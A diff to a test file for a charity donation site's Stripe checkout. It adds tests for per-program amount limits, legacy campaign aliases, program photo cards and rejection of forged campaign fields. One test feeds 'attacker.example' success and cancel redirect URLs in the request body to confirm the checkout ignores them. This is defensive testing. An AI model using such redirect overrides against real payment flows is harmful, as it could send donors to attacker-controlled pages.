@@ -16,6 +16,52 @@ const importFunctionModule = async (relativePath) => {
   return import(`data:text/javascript;base64,${encoded}`);
 };
 
+const checkoutModulePaths = [
+  "functions/charity/donations/checkout.js",
+  "../functions/charity/donations/checkout.js",
+];
+
+const callCheckout = async (modulePath, body, env = {}) => {
+  const checkout = await importFunctionModule(modulePath);
+  const originalFetch = globalThis.fetch;
+  let stripeBody = "";
+  let stripeCalls = 0;
+
+  globalThis.fetch = async (_url, options) => {
+    stripeCalls += 1;
+    stripeBody = String(options.body || "");
+    return new Response(JSON.stringify({ url: "https://checkout.stripe.test/catalog" }), {
+      status: 200,
+      headers: { "Content-Type": "application/json" },
+    });
+  };
+
+  try {
+    const response = await checkout.onRequestPost({
+      request: new Request("https://pages.example/charity/donations/checkout", {
+        method: "POST",
+        body: JSON.stringify({
+          donor_name: "Catalog Donor",
+          donor_email: "catalog@example.com",
+          payment_method: "stripe",
+          giving_frequency: "one_time",
+          ...body,
+        }),
+      }),
+      env: { OWR_STRIPE_SECRET_KEY: "sk_test_mock", ...env },
+    });
+    const payload = await response.json();
+    return {
+      response,
+      payload,
+      stripeCalls,
+      stripeForm: new URLSearchParams(stripeBody),
+    };
+  } finally {
+    globalThis.fetch = originalFetch;
+  }
+};
+
 const createGooglePrivateKey = async () => {
   return crypto.subtle.generateKey(
     {
@@ -97,6 +143,55 @@ test("checkout creates a one-time Stripe session with a $5 minimum and configure
   }
 });
 
+test("checkout ignores body redirect overrides and only accepts trusted HTTPS environment redirects", async () => {
+  for (const modulePath of checkoutModulePaths) {
+    const requestOriginFallback = await callCheckout(modulePath, {
+      program_id: "unrestricted",
+      amount_usd: 25,
+      success_url: "https://attacker.example/paid",
+      cancel_url: "https://attacker.example/cancelled",
+    });
+    const fallbackSuccess = new URL(requestOriginFallback.stripeForm.get("success_url"));
+    const fallbackCancel = new URL(requestOriginFallback.stripeForm.get("cancel_url"));
+    assert.equal(fallbackSuccess.origin, "https://pages.example", modulePath);
+    assert.equal(fallbackSuccess.pathname, "/charity/thank-you", modulePath);
+    assert.equal(fallbackCancel.origin, "https://pages.example", modulePath);
+    assert.equal(fallbackCancel.pathname, "/charity/cancelled", modulePath);
+
+    const trustedConfigured = await callCheckout(modulePath, {
+      program_id: "unrestricted",
+      amount_usd: 25,
+      success_url: "https://attacker.example/paid",
+      cancel_url: "https://attacker.example/cancelled",
+    }, {
+      OWR_SUCCESS_URL: "https://one-world-relief.org/charity/thank-you",
+      OWR_CANCEL_URL: "https://one-world-relief.org/charity/cancelled",
+    });
+    assert.equal(new URL(trustedConfigured.stripeForm.get("success_url")).origin, "https://one-world-relief.org", modulePath);
+    assert.equal(new URL(trustedConfigured.stripeForm.get("cancel_url")).origin, "https://one-world-relief.org", modulePath);
+
+    const mismatchedConfigured = await callCheckout(modulePath, {
+      program_id: "unrestricted",
+      amount_usd: 25,
+    }, {
+      OWR_SUCCESS_URL: "https://one-world-relief.org/charity/thank-you",
+      OWR_CANCEL_URL: "https://attacker.example/cancelled",
+    });
+    assert.equal(new URL(mismatchedConfigured.stripeForm.get("success_url")).origin, "https://pages.example", modulePath);
+    assert.equal(new URL(mismatchedConfigured.stripeForm.get("cancel_url")).origin, "https://pages.example", modulePath);
+
+    const insecureConfigured = await callCheckout(modulePath, {
+      program_id: "unrestricted",
+      amount_usd: 25,
+    }, {
+      OWR_SUCCESS_URL: "http://one-world-relief.org/charity/thank-you",
+      OWR_CANCEL_URL: "http://one-world-relief.org/charity/cancelled",
+    });
+    assert.equal(new URL(insecureConfigured.stripeForm.get("success_url")).origin, "https://pages.example", modulePath);
+    assert.equal(new URL(insecureConfigured.stripeForm.get("cancel_url")).origin, "https://pages.example", modulePath);
+  }
+});
+
 test("checkout supports Apple Pay through Stripe card wallets", async () => {
   const checkout = await importFunctionModule("functions/charity/donations/checkout.js");
   const originalFetch = globalThis.fetch;
@@ -117,7 +212,7 @@ test("checkout supports Apple Pay through Stripe card wallets", async () => {
         body: JSON.stringify({
           donor_name: "Apple Donor",
           donor_email: "apple@example.com",
-          amount_usd: 5,
+          amount_usd: 300,
           payment_method: "apple_pay",
           campaign: "Orphan Support",
         }),
@@ -154,7 +249,7 @@ test("checkout supports Cash App Pay through Stripe Checkout", async () => {
         body: JSON.stringify({
           donor_name: "Cash Donor",
           donor_email: "cash@example.com",
-          amount_usd: 5,
+          amount_usd: 100,
           payment_method: "cash_app",
           campaign: "Feeding",
         }),
@@ -289,7 +384,7 @@ test("checkout redirects Venmo only when a Venmo URL is configured", async () =>
   const requestBody = {
     donor_name: "Venmo Donor",
     donor_email: "venmo@example.com",
-    amount_usd: 7,
+    amount_usd: 350,
     payment_method: "venmo",
     campaign: "Wells",
   };
@@ -319,8 +414,8 @@ test("checkout redirects Venmo only when a Venmo URL is configured", async () =>
   assert.equal(configuredResponse.status, 200);
   assert.equal(payload.provider, "venmo");
   assert.equal(redirect.hostname, "account.venmo.com");
-  assert.equal(redirect.searchParams.get("amount"), "7.00");
-  assert.match(redirect.searchParams.get("note"), /One World Relief - Wells/);
+  assert.equal(redirect.searchParams.get("amount"), "350.00");
+  assert.match(redirect.searchParams.get("note"), /One World Relief - Water Support/);
 });
 
 test("thank-you page renders polished animated donation thanks", async () => {
@@ -376,16 +471,17 @@ test("share QR points donors to the .org donation domain", async () => {
   assert.doesNotMatch(shareHtml, /<span class="share-icon"/);
 });
 
-test("donation page presents a simple one-time Stripe checkout with a $5 minimum", async () => {
-  const [donateHtml, siteJs, siteCss, deployedCheckoutSource, mirrorCheckoutSource] = await Promise.all([
+test("donation page leads with unrestricted $5 giving and purpose-specific amount rules", async () => {
+  const [donateHtml, checkoutJs, programSource, siteCss, deployedCheckoutSource, mirrorCheckoutSource] = await Promise.all([
     readFile("donate.html", "utf8"),
-    readFile("one-world-relief.js", "utf8"),
+    readFile("donation-checkout.js", "utf8"),
+    readFile("donation-programs.js", "utf8"),
     readFile("one-world-relief.css", "utf8"),
     readFile("functions/charity/donations/checkout.js", "utf8"),
     readFile("../functions/charity/donations/checkout.js", "utf8"),
   ]);
 
-  const donationForm = donateHtml.match(/<form id="donationForm">[\s\S]*?<\/form>/)?.[0];
+  const donationForm = donateHtml.match(/<form id="donationForm"[^>]*>[\s\S]*?<\/form>/)?.[0];
   assert.ok(donationForm, "donate page should contain the checkout form");
   const presetAmounts = [...donationForm.matchAll(/name="amount" value="([^"]+)"/g)].map((match) => match[1]);
   assert.deepEqual(presetAmounts, ["5", "25", "50", "100"]);
@@ -402,7 +498,14 @@ test("donation page presents a simple one-time Stripe checkout with a $5 minimum
   assert.match(customAmountInput, /aria-describedby="minimumDonationText"/);
   assert.doesNotMatch(customAmountInput, /hidden/);
   assert.match(donationForm, /id="minimumDonationText">Minimum donation is \$5\.<\/p>/);
-  assert.doesNotMatch(donationForm, /customDonationPanel|givingFrequencySelect|name="givingFrequency"|recurringDonationNote/);
+  assert.match(donationForm, /data-program-checkout="true"/);
+  assert.match(donationForm, /id="selectedProgramId" type="hidden" value="unrestricted"/);
+  assert.match(donationForm, /id="selectedProgramVariant" type="hidden"/);
+  assert.match(donationForm, /id="donationReferrerCase" type="hidden"/);
+  assert.match(donationForm, /id="selectedProgramTitle">Give Where It.s Needed Most<\/h3>/);
+  assert.match(donationForm, /id="selectedProgramAmount">Any amount from \$5<\/strong>/);
+  assert.match(donationForm, /<select id="campaignSelect" required>[\s\S]*?<option value="unrestricted">Where it's needed most<\/option>/);
+  assert.doesNotMatch(donationForm, /givingFrequencySelect|name="givingFrequency"|recurringDonationNote/);
   assert.doesNotMatch(donationForm, /id="paymentMethod"|donation-step-payment|aria-label="Supported payment methods"|class="payments"/);
   assert.doesNotMatch(donationForm, /Apple Pay|Cash App Pay|Mastercard|Venmo|Monthly recurring|Every Friday/);
 
@@ -424,15 +527,20 @@ test("donation page presents a simple one-time Stripe checkout with a $5 minimum
   assert.match(donationForm, /Continue to secure checkout/);
   assert.match(donationForm, /Stripe securely handles your payment\. One World Relief never receives your card details\./);
 
-  assert.match(siteJs, /donor_note: donorNote/);
-  assert.match(siteJs, /anonymous_public: anonymousDonation/);
-  assert.match(siteJs, /payment_method: "stripe"/);
-  assert.match(siteJs, /giving_frequency: "one_time"/);
-  assert.match(siteJs, /!Number\.isFinite\(amountUsd\) \|\| amountUsd < 5/);
-  assert.match(siteJs, /customDonationInput\?\.value/);
-  assert.match(siteJs, /radio\.checked = false/);
-  assert.doesNotMatch(siteJs, /givingFrequencySelect|paymentMethodSelect|syncRecurringPaymentAvailability|syncCustomAmountPanel|recurringBlockedMethods/);
-  assert.doesNotMatch(siteJs, /params\.get\("frequency"\)|frequency: String\(frequency/);
+  assert.match(donateHtml, /<script src="donation-programs\.js"><\/script>[\s\S]*?<script src="donation-checkout\.js"><\/script>/);
+  assert.match(checkoutJs, /const getAmountRule = \(program, variant\) =>/);
+  assert.match(checkoutJs, /if \(rule\.type === "fixed"\)/);
+  assert.match(checkoutJs, /if \(rule\.type === "range"\)/);
+  assert.match(checkoutJs, /return amount >= rule\.min/);
+  assert.match(checkoutJs, /program_id: program\.id/);
+  assert.match(checkoutJs, /program_variant: variant\?\.id \|\| ""/);
+  assert.match(checkoutJs, /referrer_case: referrerInput\?\.value \|\| ""/);
+  assert.match(checkoutJs, /campaign: program\.campaign/);
+  assert.match(checkoutJs, /payment_method: "stripe"/);
+  assert.match(checkoutJs, /giving_frequency: "one_time"/);
+  assert.match(checkoutJs, /donor_note: donorNote/);
+  assert.match(checkoutJs, /anonymous_public: anonymous/);
+  assert.doesNotMatch(checkoutJs, /givingFrequencySelect|paymentMethodSelect|syncRecurringPaymentAvailability|recurringBlockedMethods/);
 
   assert.match(siteCss, /\.donation-form-card \.custom-donation-input-wrap/);
   assert.match(siteCss, /\.donation-trust-note/);
@@ -446,6 +554,39 @@ test("donation page presents a simple one-time Stripe checkout with a $5 minimum
     assert.match(source, /!Number\.isFinite\(amountUsd\) \|\| amountUsd < 5/, `${label} should enforce $5 in code`);
     assert.match(source, /Donation amount must be at least \$5\./, `${label} should explain the minimum`);
   }
+
+  const catalogContext = { window: {} };
+  runInNewContext(programSource, catalogContext);
+  const programs = JSON.parse(JSON.stringify(catalogContext.window.ONE_WORLD_RELIEF_DONATION_PROGRAMS));
+  const summarizeRule = (id) => {
+    const program = programs.find((item) => item.id === id);
+    assert.ok(program, `${id} should be in the public catalog`);
+    return {
+      rule: program.amountRule,
+      min: program.minAmount,
+      max: program.maxAmount ?? null,
+      defaultAmount: program.defaultAmount,
+    };
+  };
+  assert.equal(programs.length, 8);
+  assert.deepEqual(summarizeRule("unrestricted"), { rule: "minimum", min: 5, max: null, defaultAmount: 25 });
+  assert.deepEqual(summarizeRule("orphan_annual"), { rule: "fixed", min: 300, max: 300, defaultAmount: 300 });
+  assert.deepEqual(summarizeRule("mosque_build"), { rule: "fixed", min: 1000, max: 1000, defaultAmount: 1000 });
+  assert.deepEqual(summarizeRule("water_support"), { rule: "range", min: 350, max: 3000, defaultAmount: 350 });
+  assert.deepEqual(summarizeRule("orphan_feeding"), { rule: "minimum", min: 100, max: null, defaultAmount: 100 });
+  assert.deepEqual(summarizeRule("family_recovery"), { rule: "fixed", min: 600, max: 600, defaultAmount: 600 });
+  assert.deepEqual(summarizeRule("emergency_aid"), { rule: "minimum", min: 25, max: null, defaultAmount: 25 });
+  assert.deepEqual(summarizeRule("zakat"), { rule: "minimum", min: 5, max: null, defaultAmount: 25 });
+
+  const water = programs.find((program) => program.id === "water_support");
+  assert.deepEqual(
+    water.variants.map(({ id, amount }) => ({ id, amount })),
+    [
+      { id: "water_station", amount: 350 },
+      { id: "water_contribution", amount: 1000 },
+      { id: "community_well", amount: 3000 },
+    ],
+  );
 
   for (const modulePath of [
     "functions/charity/donations/checkout.js",
@@ -470,6 +611,47 @@ test("donation page presents a simple one-time Stripe checkout with a $5 minimum
     assert.equal(response.status, 400, `${modulePath} should reject donations below $5`);
     assert.equal(payload.detail, "Donation amount must be at least $5.");
   }
+});
+
+test("donation catalog renders approved real-photo cards in responsive 3-2-1 columns", async () => {
+  const [programSource, checkoutJs, siteCss] = await Promise.all([
+    readFile("donation-programs.js", "utf8"),
+    readFile("donation-checkout.js", "utf8"),
+    readFile("one-world-relief.css", "utf8"),
+  ]);
+  const context = { window: {} };
+  runInNewContext(programSource, context);
+  const programs = JSON.parse(JSON.stringify(context.window.ONE_WORLD_RELIEF_DONATION_PROGRAMS));
+  const featured = programs.filter((program) => program.featured === true);
+
+  assert.equal(featured.length, 6);
+  assert.deepEqual(featured.map((program) => program.id), [
+    "orphan_annual",
+    "mosque_build",
+    "water_support",
+    "orphan_feeding",
+    "family_recovery",
+    "emergency_aid",
+  ]);
+  assert.match(checkoutJs, /programs\.filter\(\(program\) => program\.featured === true\)\.forEach/);
+  assert.match(checkoutJs, /card\.className = "donation-program-card"/);
+  assert.match(checkoutJs, /image\.src = program\.imageUrl/);
+  assert.match(checkoutJs, /caption\.textContent = program\.photoContext/);
+
+  for (const program of featured) {
+    assert.match(program.imageUrl, /^assets\/projects\/case-\d{3}\/[a-z0-9-]+\.jpg$/);
+    assert.match(program.photoContext, /Photo|photo/);
+    assert.ok(program.imageAlt.length > 20);
+    const photo = await readFile(program.imageUrl);
+    assert.ok(photo.byteLength > 50_000, `${program.id} should use a usable real project photo`);
+    assert.deepEqual([...photo.subarray(0, 3)], [0xff, 0xd8, 0xff], `${program.id} photo should be a JPEG`);
+  }
+
+  assert.match(siteCss, /\.donation-program-grid\s*\{[^}]*grid-template-columns: repeat\(3, minmax\(0, 1fr\)\)/);
+  assert.match(siteCss, /@media \(max-width: 980px\)[\s\S]*?\.donation-program-grid\s*\{[^}]*grid-template-columns: repeat\(2, minmax\(0, 1fr\)\)/);
+  assert.match(siteCss, /@media \(max-width: 720px\)[\s\S]*?\.donation-program-grid\s*\{[^}]*grid-template-columns: 1fr/);
+  const catalogRules = siteCss.slice(siteCss.indexOf(".donation-program-grid {"), siteCss.indexOf(".donation-program-action {"));
+  assert.doesNotMatch(catalogRules, /animation\s*:/);
 });
 
 test("donation page renders a static real-photo Case 004-006 collage beside checkout", async () => {
@@ -541,7 +723,7 @@ test(".com host redirects to .org", async () => {
 
 test("pages include the supplied One World Relief logo and install icons", async () => {
   const rootPageNames = ["index.html", "about.html", "contact.html", "donate.html", "projects.html", "share.html"];
-  const projectPageNames = Array.from({ length: 8 }, (_, index) => `projects/case-${String(index + 1).padStart(3, "0")}.html`);
+  const projectPageNames = Array.from({ length: 9 }, (_, index) => `projects/case-${String(index + 1).padStart(3, "0")}.html`);
   const [rootPages, projectPages, offlineHtml, faviconPng, brandIcon, brandIconSmall, appleTouchIcon, webManifest, serviceWorker] = await Promise.all([
     Promise.all(rootPageNames.map((name) => readFile(name, "utf8"))),
     Promise.all(projectPageNames.map((name) => readFile(name, "utf8"))),
@@ -577,49 +759,174 @@ test("pages include the supplied One World Relief logo and install icons", async
   assert.match(webManifest, /"name": "One World Relief"/);
   assert.match(webManifest, /one-world-relief-icon-192\.png/);
   assert.match(webManifest, /one-world-relief-icon\.png/);
-  assert.match(serviceWorker, /owr-offline-v6/);
+  assert.match(serviceWorker, /owr-offline-v7/);
   assert.match(serviceWorker, /one-world-relief-icon\.png/);
 });
 
-test("checkout preserves a selected project destination in Stripe metadata and product details", async () => {
-  const checkout = await importFunctionModule("functions/charity/donations/checkout.js");
-  const originalFetch = globalThis.fetch;
-  const campaign = "Madrasa Water";
-  let stripeBody = "";
+test("both checkout mirrors enforce every donation-program amount boundary", async () => {
+  const validCases = [
+    { label: "unrestricted minimum", body: { program_id: "unrestricted", amount_usd: 5 } },
+    { label: "unrestricted above minimum", body: { program_id: "unrestricted", amount_usd: 5.01 } },
+    { label: "annual orphan fixed gift", body: { program_id: "orphan_annual", amount_usd: 300 } },
+    { label: "mosque construction fixed gift", body: { program_id: "mosque_build", amount_usd: 1000 } },
+    { label: "water station fixed gift", body: { program_id: "water_support", program_variant: "water_station", amount_usd: 350 } },
+    { label: "water contribution lower bound", body: { program_id: "water_support", program_variant: "water_contribution", amount_usd: 350 } },
+    { label: "water contribution middle", body: { program_id: "water_support", program_variant: "water_contribution", amount_usd: 1425.50 } },
+    { label: "water contribution upper bound", body: { program_id: "water_support", program_variant: "water_contribution", amount_usd: 3000 } },
+    { label: "water well fixed gift", body: { program_id: "water_support", program_variant: "community_well", amount_usd: 3000 } },
+    { label: "water station inferred", body: { program_id: "water_support", amount_usd: 350 } },
+    { label: "water contribution inferred", body: { program_id: "water_support", amount_usd: 351 } },
+    { label: "water well inferred", body: { program_id: "water_support", amount_usd: 3000 } },
+    { label: "orphan feeding minimum", body: { program_id: "orphan_feeding", amount_usd: 100 } },
+    { label: "orphan feeding above minimum", body: { program_id: "orphan_feeding", amount_usd: 100.01 } },
+    { label: "family recovery fixed gift", body: { program_id: "family_recovery", amount_usd: 600 } },
+    { label: "emergency aid minimum", body: { program_id: "emergency_aid", amount_usd: 25 } },
+    { label: "emergency aid above minimum", body: { program_id: "emergency_aid", amount_usd: 25.01 } },
+    { label: "Zakat minimum", body: { program_id: "zakat", amount_usd: 5 } },
+  ];
+  const invalidCases = [
+    { label: "unrestricted below minimum", body: { program_id: "unrestricted", amount_usd: 4.99 } },
+    { label: "annual orphan below fixed gift", body: { program_id: "orphan_annual", amount_usd: 299.99 } },
+    { label: "annual orphan above fixed gift", body: { program_id: "orphan_annual", amount_usd: 300.01 } },
+    { label: "mosque construction below fixed gift", body: { program_id: "mosque_build", amount_usd: 999.99 } },
+    { label: "mosque construction above fixed gift", body: { program_id: "mosque_build", amount_usd: 1000.01 } },
+    { label: "water station wrong amount", body: { program_id: "water_support", program_variant: "water_station", amount_usd: 350.01 } },
+    { label: "water contribution below range", body: { program_id: "water_support", program_variant: "water_contribution", amount_usd: 349.99 } },
+    { label: "water contribution above range", body: { program_id: "water_support", program_variant: "water_contribution", amount_usd: 3000.01 } },
+    { label: "water well wrong amount", body: { program_id: "water_support", program_variant: "community_well", amount_usd: 2999.99 } },
+    { label: "orphan feeding below minimum", body: { program_id: "orphan_feeding", amount_usd: 99.99 } },
+    { label: "family recovery below fixed gift", body: { program_id: "family_recovery", amount_usd: 599.99 } },
+    { label: "family recovery above fixed gift", body: { program_id: "family_recovery", amount_usd: 600.01 } },
+    { label: "emergency aid below minimum", body: { program_id: "emergency_aid", amount_usd: 24.99 } },
+    { label: "Zakat below global minimum", body: { program_id: "zakat", amount_usd: 4.99 } },
+    { label: "more than two decimal places", body: { program_id: "unrestricted", amount_usd: 5.001 } },
+  ];
 
-  globalThis.fetch = async (_url, options) => {
-    stripeBody = String(options.body);
-    return new Response(JSON.stringify({ url: "https://checkout.stripe.test/project-destination" }), {
-      status: 200,
-      headers: { "Content-Type": "application/json" },
+  for (const modulePath of checkoutModulePaths) {
+    for (const { label, body } of validCases) {
+      const result = await callCheckout(modulePath, body);
+      assert.equal(result.response.status, 200, `${modulePath}: ${label}`);
+      assert.equal(result.stripeCalls, 1, `${modulePath}: ${label} should reach Stripe once`);
+      assert.equal(result.stripeForm.get("line_items[0][price_data][unit_amount]"), String(Math.round(body.amount_usd * 100)));
+    }
+    for (const { label, body } of invalidCases) {
+      const result = await callCheckout(modulePath, body);
+      assert.equal(result.response.status, 400, `${modulePath}: ${label}`);
+      assert.equal(result.stripeCalls, 0, `${modulePath}: ${label} must fail before Stripe`);
+      assert.ok(result.payload.detail, `${modulePath}: ${label} should explain the error`);
+    }
+  }
+});
+
+test("checkout rejects unknown programs, variants, forged destinations, and invalid referrers", async () => {
+  const rejected = [
+    {
+      label: "unknown program",
+      body: { program_id: "not_a_program", campaign: "General Fund", amount_usd: 25 },
+      detail: /valid donation program/,
+    },
+    {
+      label: "unknown legacy destination",
+      body: { campaign: "Invented Campaign", amount_usd: 25 },
+      detail: /valid donation destination/,
+    },
+    {
+      label: "variant on a non-water program",
+      body: { program_id: "orphan_annual", program_variant: "community_well", amount_usd: 300 },
+      detail: /does not accept that option/,
+    },
+    {
+      label: "unknown water variant",
+      body: { program_id: "water_support", program_variant: "private_well", amount_usd: 350 },
+      detail: /valid water-support option/,
+    },
+    {
+      label: "invalid case referrer",
+      body: { program_id: "unrestricted", referrer_case: "private-record-9", amount_usd: 25 },
+      detail: /valid project reference/,
+    },
+  ];
+
+  for (const modulePath of checkoutModulePaths) {
+    for (const { label, body, detail } of rejected) {
+      const result = await callCheckout(modulePath, body);
+      assert.equal(result.response.status, 400, `${modulePath}: ${label}`);
+      assert.equal(result.stripeCalls, 0, `${modulePath}: ${label} must not reach Stripe`);
+      assert.match(result.payload.detail, detail, `${modulePath}: ${label}`);
+    }
+  }
+});
+
+test("checkout derives Stripe product details and metadata from its canonical catalog", async () => {
+  for (const modulePath of checkoutModulePaths) {
+    const result = await callCheckout(modulePath, {
+      program_id: "water_support",
+      program_variant: "water_station",
+      referrer_case: "Case 9",
+      campaign: "Forged Campaign",
+      program_label: "Forged Label",
+      purpose_summary: "Forged purpose",
+      amount_usd: 350,
+      donor_note: "In memory of a friend",
+      anonymous_public: true,
     });
-  };
+    const form = result.stripeForm;
 
-  try {
-    const response = await checkout.onRequestPost({
-      request: new Request("https://pages.example/charity/donations/checkout", {
-        method: "POST",
-        body: JSON.stringify({
-          donor_name: "Project Donor",
-          donor_email: "project@example.com",
-          amount_usd: 20,
-          payment_method: "stripe",
-          campaign,
-          giving_frequency: "one_time",
-        }),
-      }),
-      env: { OWR_STRIPE_SECRET_KEY: "sk_test_mock" },
-    });
-    const payload = await response.json();
-    const form = new URLSearchParams(stripeBody);
+    assert.equal(result.response.status, 200, modulePath);
+    assert.equal(result.payload.program_id, "water_support");
+    assert.equal(result.payload.program_label, "Water Support");
+    assert.equal(result.payload.program_variant, "water_station");
+    assert.equal(result.payload.program_option_label, "Filtered Water Station");
+    assert.equal(result.payload.campaign, "Water Support");
+    assert.equal(form.get("line_items[0][price_data][product_data][name]"), "One World Relief - Water Support - Filtered Water Station");
+    assert.equal(
+      form.get("line_items[0][price_data][product_data][description]"),
+      "A $350 gift that helps fund a filtered water cooler or station for hot-weather drinking water.",
+    );
+    const expectedMetadata = {
+      campaign: "Water Support",
+      program_id: "water_support",
+      program_label: "Water Support",
+      program_variant: "water_station",
+      program_option_label: "Filtered Water Station",
+      purpose_summary: "A $350 gift that helps fund a filtered water cooler or station for hot-weather drinking water.",
+      referrer_case: "case-009",
+      donor_note: "In memory of a friend",
+      anonymous_public: "yes",
+    };
+    for (const [key, value] of Object.entries(expectedMetadata)) {
+      assert.equal(form.get(`metadata[${key}]`), value, `${modulePath}: session metadata ${key}`);
+      assert.equal(form.get(`payment_intent_data[metadata][${key}]`), value, `${modulePath}: payment metadata ${key}`);
+    }
+    assert.doesNotMatch(form.toString(), /Forged(?:\+|%20)(?:Campaign|Label|purpose)/i);
+  }
+});
 
-    assert.equal(response.status, 200);
-    assert.equal(payload.redirect_url, "https://checkout.stripe.test/project-destination");
-    assert.equal(form.get("metadata[campaign]"), campaign);
-    assert.equal(form.get("payment_intent_data[metadata][campaign]"), campaign);
-    assert.equal(form.get("line_items[0][price_data][product_data][name]"), `One World Relief - ${campaign}`);
-  } finally {
-    globalThis.fetch = originalFetch;
+test("legacy campaign aliases resolve to canonical donation programs", async () => {
+  const aliases = [
+    { campaign: "General Fund", amount_usd: 5, program: "unrestricted", canonical: "General Fund" },
+    { campaign: "Orphan Support", amount_usd: 300, program: "orphan_annual", canonical: "Orphan Annual Support" },
+    { campaign: "Mosque Tiles", amount_usd: 1000, program: "mosque_build", canonical: "Mosque Construction" },
+    { campaign: "Madrasa Water", amount_usd: 350, program: "water_support", canonical: "Water Support", variant: "water_station" },
+    { campaign: "Feeding Madrasa for Orphan Kids", amount_usd: 100, program: "orphan_feeding", canonical: "Orphan Feeding" },
+    { campaign: "Father's Business Support", amount_usd: 600, program: "family_recovery", canonical: "Family Recovery" },
+    { campaign: "Flood Relief", amount_usd: 25, program: "emergency_aid", canonical: "Emergency Aid" },
+    { campaign: "Zakat", amount_usd: 5, program: "zakat", canonical: "Zakat" },
+  ];
+
+  for (const modulePath of checkoutModulePaths) {
+    for (const expected of aliases) {
+      const result = await callCheckout(modulePath, {
+        campaign: expected.campaign,
+        amount_usd: expected.amount_usd,
+      });
+      assert.equal(result.response.status, 200, `${modulePath}: ${expected.campaign}`);
+      assert.equal(result.payload.program_id, expected.program);
+      assert.equal(result.payload.campaign, expected.canonical);
+      assert.equal(result.payload.program_variant, expected.variant || "");
+      assert.equal(result.stripeForm.get("metadata[program_id]"), expected.program);
+      assert.equal(result.stripeForm.get("metadata[campaign]"), expected.canonical);
+    }
   }
 });
 
@@ -635,19 +942,18 @@ test("offline fallback shows branded connection page after first visit", async (
   assert.match(offlineHtml, /offline-dino-scene/);
   assert.match(offlineHtml, /Try Again/);
   assert.match(siteJs, /navigator\.serviceWorker\.register\("\/sw\.js"\)/);
-  assert.match(serviceWorker, /owr-offline-v6/);
+  assert.match(serviceWorker, /owr-offline-v7/);
   assert.match(serviceWorker, /caches\.match\("\/offline\.html"\)/);
   assert.match(siteCss, /\.offline-dino/);
   assert.match(siteCss, /@keyframes offline-dino-hop/);
 });
 
-test("homepage checkout keeps accessible one-time amounts and allowlisted project destinations", async () => {
-  const [homeHtml, donateHtml, siteJs, siteCss, projectDataSource] = await Promise.all([
+test("homepage checkout keeps accessible one-time amounts and sends unrestricted $5-plus gifts to the catalog checkout", async () => {
+  const [homeHtml, siteJs, siteCss, programSource] = await Promise.all([
     readFile("index.html", "utf8"),
-    readFile("donate.html", "utf8"),
     readFile("one-world-relief.js", "utf8"),
     readFile("one-world-relief.css", "utf8"),
-    readFile("project-data.js", "utf8"),
+    readFile("donation-programs.js", "utf8"),
   ]);
   const quickFormMatch = homeHtml.match(/<form class="quick-donation" id="quickDonationForm"[\s\S]*?<\/form>/);
   assert.ok(quickFormMatch, "homepage should contain the quick donation form");
@@ -666,15 +972,8 @@ test("homepage checkout keeps accessible one-time amounts and allowlisted projec
   assert.match(quickForm, /id="quickAmountHint">Minimum donation is \$5\. Entering an amount replaces the selected preset\.<\/small>/);
   assert.doesNotMatch(quickForm, /quick-custom[^>]*hidden|id="quickCustomAmount"[^>]*hidden/);
   assert.doesNotMatch(quickForm, /quickFrequency|quick-frequency|<legend>Frequency<\/legend>|Monthly|One-time/);
-
-  const quickCampaignMatch = quickForm.match(/<select id="quickCampaign" name="quickCampaign">([\s\S]*?)<\/select>/);
-  assert.ok(quickCampaignMatch, "homepage should contain a labeled destination selector");
-  assert.equal([...quickCampaignMatch[1].matchAll(/<option\b/g)].length, 1, "project options should come from shared data");
-  assert.match(quickCampaignMatch[1], /<option value="General Fund">Where it's needed most<\/option>/);
-  assert.match(donateHtml, /<select id="campaignSelect" required>[\s\S]*?<option value="General Fund">Where it's needed most<\/option>/);
-  for (const html of [homeHtml, donateHtml]) {
-    assert.match(html, /<script src="project-data\.js"><\/script>\s*<script src="one-world-relief\.js"><\/script>/);
-  }
+  assert.doesNotMatch(quickForm, /quickCampaign|Donation destination|Choose a purpose/);
+  assert.match(homeHtml, /<script src="donation-programs\.js"><\/script>\s*<script src="project-data\.js"><\/script>\s*<script src="one-world-relief\.js"><\/script>/);
 
   assert.match(quickForm, /class="[^"]*\bquick-donation-button\b[^"]*"[^>]*>[\s\S]*?<span>Start Donation<\/span><span aria-hidden="true">&rarr;<\/span>/);
   assert.match(quickForm, /class="quick-donation-trust"[\s\S]*?<svg aria-hidden="true"[^>]*focusable="false"[\s\S]*?Secure checkout[\s\S]*?Receipt provided/);
@@ -690,124 +989,39 @@ test("homepage checkout keeps accessible one-time amounts and allowlisted projec
   assert.match(siteJs, /quickCustomInput\?\.setAttribute\("aria-invalid", "true"\)/);
   assert.match(siteJs, /!Number\.isFinite\(customAmount\) \|\| customAmount < 5/);
   assert.match(siteJs, /Please enter a donation amount of at least \$5\./);
-  assert.match(siteJs, /const buildQuickDonationUrl = \(\{ amount, campaign = "General Fund" \}\) =>/);
-  assert.match(siteJs, /const params = new URLSearchParams\(\{[\s\S]*?amount: String\(amount\),[\s\S]*?campaign: String\(campaign \|\| "General Fund"\),[\s\S]*?\}\)/);
-  assert.match(siteJs, /window\.location\.href = buildQuickDonationUrl\(\{ amount, campaign \}\)/);
+  assert.match(siteJs, /const buildQuickDonationUrl = \(\{ amount, program = "unrestricted" \}\) =>/);
+  assert.match(siteJs, /const params = new URLSearchParams\(\{[\s\S]*?amount: String\(amount\),[\s\S]*?program: String\(program \|\| "unrestricted"\),[\s\S]*?\}\)/);
+  assert.match(siteJs, /const program = quickCampaignSelect\?\.value \|\| "unrestricted"/);
+  assert.match(siteJs, /window\.location\.href = buildQuickDonationUrl\(\{ amount, program \}\)/);
   assert.doesNotMatch(siteJs, /input\[name="quickFrequency"\]:checked|frequency: String\(frequency|params\.get\("frequency"\)/);
-  assert.match(siteJs, /populateDonationDestinations\(quickCampaignSelect\)/);
-  assert.match(siteJs, /populateDonationDestinations\(campaignSelect\)/);
-  assert.match(siteJs, /project\.acceptsDonations !== true/);
-  assert.match(siteJs, /option\.textContent = String\(project\.donationLabel/);
-  assert.ok(
-    siteJs.indexOf("populateDonationDestinations(campaignSelect)") < siteJs.indexOf("applyDonationParams();"),
-    "donate page destinations must exist before campaign query hydration",
-  );
 
-  const projectContext = { window: {} };
-  runInNewContext(projectDataSource, projectContext);
-  const projects = JSON.parse(JSON.stringify(projectContext.window.ONE_WORLD_RELIEF_PROJECTS));
-  assert.equal(projects.length, 8);
-  assert.ok(projects.every((project) => typeof project.acceptsDonations === "boolean"));
-  assert.ok(projects.every((project) => typeof project.donationLabel === "string" && project.donationLabel));
-  assert.deepEqual(
-    projects.filter((project) => project.acceptsDonations).map((project) => project.date),
